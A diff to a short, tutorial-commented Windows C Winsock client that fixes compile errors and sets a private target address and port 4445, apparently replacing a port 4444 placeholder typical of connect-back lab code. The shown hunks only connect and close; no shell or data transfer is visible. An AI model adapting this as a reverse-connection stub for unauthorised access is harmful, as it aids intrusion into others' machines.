@@ -2,7 +2,7 @@
 //Let's load the neccessary libraries want to smooth execution of the code.
 #include <stdio.h>
 #include <winsock2.h>
-#include <WS2tcpip.h>
+#include <ws2tcpip.h>
 
 //Add the pragma comment
 //this directive used to link the library to the linker.
@@ -24,7 +24,7 @@ int main()
     //create a structure for client addr to specify connection option.
     struct sockaddr_in client_addr; //Structure required by connect.
 
-    result = WSAStartup(MAKEWORD(2, 2) &wsastructure); //Initialization of winsock occurs here the result is store that.
+    result = WSAStartup(MAKEWORD(2, 2), &wsastructure); //Initialization of winsock occurs here the result is store that.
     if (result != 0)
     {
         printf("[!] Winsock Initilization Failed\n");
@@ -32,12 +32,12 @@ int main()
     }
 
     //create the socket
-    client_soc = sock(AF_INET, SOCK_STREAM, 0);
+    client_soc = socket(AF_INET, SOCK_STREAM, 0);
 
     //Now, specify the network details below
     client_addr.sin_family = AF_INET;
-    client_addr.sin_port = htons(4444);
-    client_addr.sin_addr.s_addr = inet_addr("Specify The IP");
+    client_addr.sin_port = htons(4445);
+    client_addr.sin_addr.s_addr = inet_addr("192.168.1.52");
 
     //Now will implement conncet function.
     connect(client_soc, (SOCKADDR*) &client_addr, sizeof(client_addr));
@@ -52,7 +52,7 @@ int main()
 
     //Close and clean the socket.
     closesocket(client_soc);
-    WSAcleanup();
+    WSACleanup();
     return 0;
 
 
